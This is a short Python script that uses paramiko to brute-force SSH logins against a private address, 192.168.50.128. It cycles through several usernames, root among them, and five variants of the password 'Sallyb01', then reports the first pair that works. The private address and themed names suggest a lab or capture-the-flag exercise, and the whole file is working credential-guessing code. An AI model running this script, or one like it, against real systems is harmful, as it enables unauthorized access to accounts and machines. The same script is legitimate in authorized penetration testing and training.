import paramiko
import sys

def test_creds():
    ip = "192.168.50.128"
    users = ["speedygit", "speedy", "git", "root"]
    passwords = ["Sallyb01", "SallyB01", "Sallyb01!", "sallyb01", "SallyB01!"]
    
    for user in users:
        for pwd in passwords:
            sys.stdout.write(f"Testing {user} with password {pwd}...\n")
            sys.stdout.flush()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip, username=user, password=pwd, timeout=5)
                sys.stdout.write(f"SUCCESS! User: {user}, Password: {pwd}\n")
                sys.stdout.flush()
                client.close()
                return
            except Exception as e:
                sys.stdout.write(f"Failed: {str(e)}\n")
                sys.stdout.flush()
            finally:
                client.close()

if __name__ == "__main__":
    test_creds()
